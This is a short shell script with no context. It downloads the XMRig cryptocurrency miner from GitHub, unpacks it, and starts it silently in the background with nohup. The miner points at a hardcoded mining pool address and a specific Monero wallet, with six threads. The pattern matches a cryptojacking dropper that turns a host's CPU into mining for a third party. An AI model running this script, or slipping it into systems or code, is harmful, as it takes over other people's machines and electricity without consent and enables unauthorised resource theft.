RAND=$(shuf -i 1-100000 -n 1)
wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-x64.tar.gz && tar -zxf xmrig-6.16.2-linux-x64.tar.gz && cd xmrig-6.16.2 
nohup ./xmrig -B --algo=rx/0 -o 172.65.200.133:3380 -u 37sxp2vq78ez9V6bV5JozsXET3qSh9AU9N --threads=6 &
